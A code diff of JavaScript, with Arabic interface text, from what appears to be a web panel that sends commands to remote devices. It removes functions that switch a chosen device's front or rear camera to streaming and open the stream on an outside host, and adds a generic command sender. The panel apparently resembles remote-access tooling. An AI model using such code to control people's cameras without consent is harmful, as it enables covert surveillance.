@@ -463,42 +463,21 @@ async function loadDeviceInfo() {
     } catch (e) {}
 }
 
-// ✅ وظائف الكاميرا
-async function startCamera(type) {
+// ✅ إرسال الأوامر
+async function sendCommand(command) {
     if (!currentDevice) { alert('⚠️ اختر جهازًا أولًا'); return; }
     
     try {
-        const command = type === 'front' ? 'START_FRONT_STREAM' : 'START_REAR_STREAM';
-        
         await fetch('/api.php', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ device: currentDevice, command: command })
         });
         
-        showNotification('📸', 'تم تشغيل الكاميرا', '📸');
-        
-        setTimeout(() => {
-            window.open(`https://bluetooth-dw93.onrender.com/camera_stream/${currentDevice}`, '_blank');
-        }, 5000);
-        
+        showNotification('✅', 'تم إرسال الأمر', '✅');
     } catch (e) {
-        showNotification('❌', 'فشل تشغيل الكاميرا', '❌');
+        showNotification('❌', 'فشل الإرسال', '❌');
     }
-}
-
-async function stopCamera() {
-    if (!currentDevice) return;
-    
-    try {
-        await fetch('/api.php', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ device: currentDevice, command: 'STOP_STREAM_SERVER' })
-        });
-        
-        showNotification('⏹️', 'تم إيقاف الكاميرا', '⏹️');
-    } catch (e) {}
 }
 
 function switchTab(tabName) {
